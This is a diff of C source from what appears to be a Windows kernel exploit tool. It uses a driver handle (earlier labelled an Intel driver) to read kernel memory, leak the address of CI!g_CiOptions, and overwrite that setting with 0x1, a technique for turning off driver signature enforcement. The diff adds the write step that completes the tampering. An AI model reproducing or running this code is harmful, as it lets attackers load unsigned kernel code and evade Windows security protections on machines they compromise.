@@ -19,6 +19,7 @@ int main(int argc, char **argv)
   LPVOID PhysAddr      = 0;
   DWORD  CiImageLen    = 0;
   ULONG  CurrentCiVal  = 0;
+  ULONG  CurrentCiFix  = 1;
 
   CiImageBase = KeGetBase("CI.dll", &CiImageLen);
   if ( (CiImageBase != NULL) )
@@ -28,19 +29,18 @@ int main(int argc, char **argv)
     {
       printf("[+] Leaked CI!g_CiOptions @ %p\n", CigOptsBase);
 
-      system("pause");
       if ( (hDriver = GetHandle()) != NULL ) 
       {
-	      printf("[+] Opened intel driver @ %p\n", hDriver);
+        printf("[+] Opened Device Handle %p\n", hDriver);
+	MemCpy(hDriver, &CurrentCiVal, CigOptsBase, 4);
 
-	      MemCpy(
-		(HANDLE)hDriver, 
-		(ULONG64)&CurrentCiVal, 
-		(ULONG64)CigOptsBase, 
-		sizeof(ULONG)
-	      );
+	printf("[+] CI!g_CiOptions = 0x%x\n", CurrentCiVal);
+	MemCpy(hDriver, CigOptsBase, &CurrentCiFix, 4);
 
-	      printf("[+] CurrentCiVal = 0x%x\n", CurrentCiVal);
+	printf("[+] Wrote 0x%x to CI!g_CiOptions\n", CurrentCiFix);
+	MemCpy(hDriver, &CurrentCiFix, CigOptsBase, 4);
+
+	printf("[+] CI!g_CiOptions = 0x%x\n", CurrentCiFix);
       };
     };
   };
